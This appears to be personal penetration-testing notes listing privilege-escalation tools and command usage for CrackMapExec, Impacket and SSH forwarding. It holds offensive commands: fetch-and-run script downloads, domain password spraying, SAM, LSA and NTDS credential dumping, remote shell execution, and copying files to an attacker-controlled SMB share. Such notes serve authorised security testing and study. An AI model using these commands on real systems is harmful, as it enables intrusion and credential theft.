# Just Some Notes I Have

## Linux Privilege Escalation
* LSE - https://github.com/diego-treitos/linux-smart-enumeration 
  * wget lse.sh;chmod 700 lse.sh; ./lse.sh > lse.txt
* Linux Exploit Suggester - https://github.com/jondonas/linux-exploit-suggester-2
  * wget les.pl; chmod 700 les.pl; perl les.pl > les.txt
* G0tM1lk - https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

## Windows Privilege Escalation 
* Powerless - https://github.com/M4ximuss/PowerlessPowerUp
* PowerUp - https://github.com/HarmJ0y/PowerUp
* Sherlock - https://github.com/rasta-mouse/Sherlock
* Fuzzy Security - https://www.fuzzysecurity.com/tutorials/16.html

## CrackMapExec
* **Download:** git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
* **Simple Scan:** cme smb [file of IPs \|IP]
* **Password Spray Against Domain:** cme smb [IP] -u [file of usernames] -p [one password]
  * Be very careful, one IP, one password, or it'll lock out the users
* **Useful CME Flags:** cme smb [IP] -u [user] -p [pass]\| -H [hash]
  * Domain Password Policy: --pass-pol
  * Use local authentication: --local-auth
  * Find SMB Shares: --shares
  * Extract SAM: --sam
  * Get LSA Secrets: --lsa 
  * Who is currently logged in: --loggedon-users
  * Load a Module: -M ie. Mimikatz
  * SCF Module: -M scuffy -o SERVER=[local machine IP] NAME=myscf [CLEANUP=TRUE]
  * Continue on Success: --continue-on-success


## Impacket
* **Install** - git clone https://github.com/SecureAuthCorp/impacket.git
   * python setup.py install
* **Log in via SMB:** psexec.py - [domain]/[username]:[password]@[ip] (optional --hashes LM:NTLM) 
* **Extract NTDS history:** secretsdump.py [domain]/[username]@[ip] -history \| tee ntds.txt
* **To get Windows Shell:** wmiexec.py [domain]/[username]:[password]@[host ip]
* **32 or 64 bit architecture:** getArch.py -target [IP]
* **Relay some NTLMv2 hashes:** https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html
* **SMB Server for transferring files:** 
   * smbserver.py -comment 'My share' TMP /tmp
   * Then on Windows host: copy [file] \\[local IP]\TMP 
   * Find the file in local machine's /tmp dir
 
### Remote Port Forwarding
* ssh -R [local port]:127.0.0.1:[target port] [user]@[local-ip]
  * Connect to the local port

### Create a SHA-512 Password (Goes in an /etc/shadow file)
* mkpasswd -m sha-512 [password]
 
### If VMTools is not doing copy/paste or other weirdness
1. killall -q -w vmtoolsd
1. vmware-user-suid-wrapper vmtoolsd -n vmusr 2>/dev/null
1. vmtoolsd -b /var/run/vmroot 2>/dev/null
